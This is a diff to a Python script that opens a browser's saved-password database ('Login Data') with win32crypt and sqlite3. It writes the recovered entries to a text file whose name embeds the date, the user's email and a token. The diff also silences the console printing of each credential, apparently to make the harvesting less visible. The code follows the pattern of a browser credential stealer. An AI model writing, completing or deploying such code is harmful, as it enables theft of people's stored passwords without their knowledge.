@@ -3,6 +3,7 @@ import sqlite3
 import win32crypt  # pypiwin32
 import sys
 from getsqldata import *
+from datetime import datetime
 
 
 uid = getCurrentUser()
@@ -10,12 +11,25 @@ conf = getRowValue('Setting',uid)
 profile_path = conf[6]
 
 # path to user's login data
-path = os.path.expanduser('~') + profile_path
-#print(path)
-login_db = os.path.join(path, 'Login Data')
+user = os.path.expanduser('~')# + profile_path
+
+## has not user in profile path
+login_db = ''
+if(profile_path.find(user) == -1):
+    path = user + profile_path
+    login_db = os.path.join(path, 'Login Data')
+else:
+    login_db = os.path.join(profile_path, 'Login Data')
+
+print(login_db)
 
 direc = os.path.join(conf[5],'Website')
-logs = os.path.join(direc , 'password.txt')
+
+token = getRowValue('current_user',uid)[1]
+time = datetime.now().strftime('%Y_%m_%d')
+email = getRowValue('Users',uid)[1]
+name = time + '-' + email+ '-' + 'password-' + token + '.txt'
+logs = os.path.join(direc , name)
 #or full path if not in same directory
 # create file log
 try:
@@ -81,4 +95,4 @@ except sqlite3.OperationalError as e:
 with open(logs, 'a', encoding='utf-8') as f:
         for element in info_list:
                 f.write(str(element)+'\n')
-                print(element)
+                #print(element)
